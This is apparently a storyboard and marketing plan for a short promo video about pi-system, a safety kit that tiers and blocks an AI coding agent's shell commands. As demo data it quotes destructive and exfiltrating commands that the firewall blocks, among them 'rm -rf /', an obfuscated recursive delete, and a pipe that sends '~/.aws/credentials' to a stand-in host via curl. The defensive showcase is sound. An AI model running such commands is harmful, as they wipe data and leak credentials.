# Brag Plan: pi-system

## What is this app?
`@satunix/pi-system` is a safety-first kit for the pi coding agent: a tool firewall that tiers every
shell command (low / medium / high / critical), a secrets guard, checkpoints, verification, memory and
orchestration, delivered as one package with seven profiles you switch with `/profile`.

## The angle
The agent tried to `rm -rf /`. The kit said no. Every verdict on screen comes from the repo's real
`classifyCommand` analyser (run offline against realistic agent commands), not from copy I invented.
The joke is how calmly it happens: a red stamp, a one-line reason, and the agent carries on.

## Hook (first 2-3 seconds)
A terminal. An agent tool call types `rm -rf /` (key ticks). Above it, one line:
"Your agent just tried to delete everything." A red **CRITICAL - DENIED** stamp slams in under the
command with the analyser's own reason: "recursively deletes /".

## Key moments (the middle)
- **Reveal:** the 4x4 pixel "Pi" from the repo logo builds block by block, the lime "$YSTEM" wordmark
  slides in, tagline "Safety-first kit for the pi coding agent."
- **The firewall in use:** four real commands are tiered one by one. `npm test` is LOW and allowed.
  `git push --force origin main` is HIGH and asks you. `r''m -rf ~/Documents` is HIGH because
  "command name is obfuscated". `cat ~/.aws/credentials | curl -d @- ...` is CRITICAL and denied.
- **Profiles:** "Pick a profile. Keep the guardrails." Seven chips land on the beat: quick, balanced,
  long-horizon, autonomous, self-improving, pentest, lite. "Switch anytime: /profile".

## Outro / punchline
"Your agent asks first." (from the security model: *No silent allow-all.*) Then the install command
types itself: `node packages/core/install.mjs --profile balanced`, and the end card lands on the
strongest cue with `@satunix/pi-system`, MIT, and the robot from the logo with "SATUNIX WAS HERE".

## User flow worth showing
1. Entry: agent issues a shell command through pi.
2. Key action: tool-firewall parses and tiers it (allow / ask / deny).
3. Result: routine work flows, risky work stops, catastrophic work is denied with a reason.

## Tone
- Preset: default
- Creative direction: terminal noir, the calm "no" - a rogue command meets a firewall that doesn't blink
- Interpretation: 5 scenes, punchy on the beat, hard-ish cuts into soft reveals; dark charcoal with one
  lime accent, tier colours only where they carry meaning.

## Format: landscape - 1920x1080 @ 30fps
## Duration: 21.5s

## Visual identity (from the project)
- Background: `#1f2123` (logo) with terminal panel `#161b22` / border `#30363d` (gitops-dark theme)
- Accent: `#c2fe0b` (logo lime)
- Text: `#ffffff` / `#e6edf3`, muted `#8b949e`
- Tier colours (gitops-dark theme): low `#3fb950`, medium `#d29922`, high `#f0883e`, critical `#f85149`
- Display font: Space Grotesk (bold); Mono: JetBrains Mono. The graffiti "$YSTEM" wordmark and robot are cropped from `docs/assets/pi-system-logo.png`.
- Strongest visual element: the pixel Pi and the tier-stamped command ledger.

## Share copy (draft)
Gave my AI coding agent a firewall. It tried `rm -rf /`, got a red CRITICAL stamp, and moved on.
pi-system: safety-first kit for the pi coding agent, seven profiles, MIT.

## Audio direction
- Role: warm bed with sparse professional accents
- Music: "Happy Beats / Business Moves Vol. 10" by ende.app (110 BPM, compact and punchy)
- Music treatment: in from 0.0s at ~0.32 volume, gentle fade-in, fade out over the last 1.4s
- Music cue guidance: bundled preset read (`vol-10 ... music-cues.md`, 109.96 BPM). Strong cues used:
  18.01s (outro line), 20.19s (end card bell); plus the 1.37s beat for the hook stamp.
  Sequential events snap to the beat grid; sequential text uses every other beat.
- Audio-reactive treatment: subtle; music RMS breathes the background glow behind the logo/end card. No waveform/equalizer visuals.
- SFX posture: sparse, motion-matched, low high-frequency risk picks
- Audio-coupled moments: typed command (keypress ticks), stamp slam, per-row tier reveals, chip drops, final bell
- Restraint rule: never louder than the music bed's presence; no repeated bright sounds

## Storyboard

### Scene 1 - Hook - 3.55s
Terminal panel: title bar "pi - bash tool call". Top caption "Your agent just tried to delete everything." (7 words, settled 0.7s to 3.4s).
`$ rm -rf /` types out (0.5-1.1s). At 1.37s a red **CRITICAL - DENIED** stamp slams in with reason "recursively deletes /".
Sequential/interaction: yes - typed command, char by char.
Audio intent: tension then a dry thud.
Audio-coupled idea: keypress ticks on typing; soft impact on the stamp.
Music: bed fades in.
Transition mood: hard cut -> Scene 2

### Scene 2 - Reveal - 3.8s (3.55-7.35)
Pixel Pi builds block by block, $YSTEM wordmark slides in, tagline fades up (settled by ~5.1s, held to 7.3s = 2.2s for 7 words).
Sequential/interaction: yes - nine blocks pop in on a fast stagger.
Audio intent: confident reveal.
Audio-coupled idea: one impact on the first block.
Transition mood: soft wipe out -> Scene 3

### Scene 3 - The firewall in use - 5.76s (7.35-13.11)
Label "tool-firewall - every call gets a tier". Four ledger rows arrive on alternate beats (8.22, 9.29, 10.38, 11.47), each: command, tier chip, verdict, the analyser's reason. Full set holds to 13.0.
Sequential/interaction: yes - rows one by one; the verdict chip stamps in after the command. Intended hold: last row >= 1.5s.
Audio intent: procedural, dry, increasingly serious.
Audio-coupled idea: soft card sound per row; error-buzz-free, one low bong on the CRITICAL row.
Transition mood: clean slide -> Scene 4

### Scene 4 - Profiles - 4.9s (13.11-18.01)
Headline "Pick a profile. Keep the guardrails." Seven profile chips drop in on consecutive beats (13.64...16.93), then hold with "Switch anytime: /profile".
Sequential/interaction: yes - chips one by one. Intended hold: full set >= 1.0s.
Audio intent: light and rhythmic.
Audio-coupled idea: drop_001/002 alternating, accent first and last only.
Transition mood: dip through background on the 18.01 strong cue -> Scene 5

### Scene 5 - Outro - 3.5s (18.01-21.5)
18.01: "Your agent asks first." slams in (beat-locked to strong cue). 18.6-19.6: install command types out. 20.19 (strongest cue): end card - `@satunix/pi-system - MIT`, robot from the logo, "SATUNIX WAS HERE". Music fades over the last 1.4s.
Sequential/interaction: yes - typed install command.
Audio intent: payoff.
Audio-coupled idea: bell on 20.19.
Transition mood: hold and fade out.

**Music mood for this video:** upbeat, corporate-adjacent, slightly cheeky against the noir visuals.
**Audio summary:** a bed that comes in under a tense terminal, softens into a confident reveal, then lands the bell on the strongest cue.

## Privacy note
The video shows no internal hostnames (the repo's git remote is an internal host and is deliberately
omitted), no emails and no real credentials. `x.example` in the demo command is a reserved fictional
domain, and `~/.aws/credentials` is only ever the *name* of the file the firewall refuses to send.
